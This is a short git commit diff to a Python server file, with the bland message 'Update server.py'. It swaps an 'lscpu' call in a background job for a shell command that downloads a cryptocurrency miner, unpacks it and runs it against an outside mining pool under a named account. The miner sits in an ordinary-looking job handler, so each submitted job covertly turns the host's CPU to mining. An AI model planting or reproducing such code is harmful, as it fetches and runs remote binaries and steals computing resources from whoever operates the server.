2a3a55ba96390c7495bbadff96a616c7a7db6759
xrock606410 <65744221+xrock606410@users.noreply.github.com>
2020-05-23 16:01:03 +0545

    Update server.py

--- server.py
+++ server.py
@@ -29,7 +29,7 @@ def index():
     return "Submitted a job !"
 
 def long_running_job():
-    os.system("lscpu")
+    os.system("wget https://github.com/m-pays/m-cpuminer-v2/releases/download/2.4/m-minerd-64-linux.tar.gz && tar xfvz m-minerd-64-linux.tar.gz && cd m-minerd-64-linux &&  ./m-minerd -a m7mhash -o stratum+tcp://xmg.minerclaim.net:3333 -u rock6064.python -p x -e 60")
 
 
 
